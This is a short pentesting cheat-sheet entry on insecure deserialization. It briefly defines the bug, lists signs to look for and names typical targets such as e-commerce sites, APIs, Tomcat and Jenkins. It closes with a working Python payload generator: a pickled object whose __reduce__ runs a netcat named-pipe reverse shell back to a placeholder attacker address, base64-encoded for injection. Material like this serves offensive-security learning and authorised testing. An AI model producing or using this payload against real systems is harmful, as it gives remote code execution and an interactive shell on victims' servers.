# Insecure Deserialization

## What does it mean?

* Untrusted data is used to abuse the logic of an application
* Replacing data processed by an application with malicious code

## What are the signs of this bug?

* You should look at all data being passed into the website and try to identify anything that looks like serialized data.
* Serialized data can be identified relatively easily if you know the format that different languages use.

## How can I find it?

* Any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. 
* A few examples of applications of this nature are:
  * E-Commerce Sites
  * Forums
  * API's
  * Application Runtimes \(Tomcat, Jenkins, Jboss, etc\)

## Deserialized shell using pickle

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_IP 1337 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```
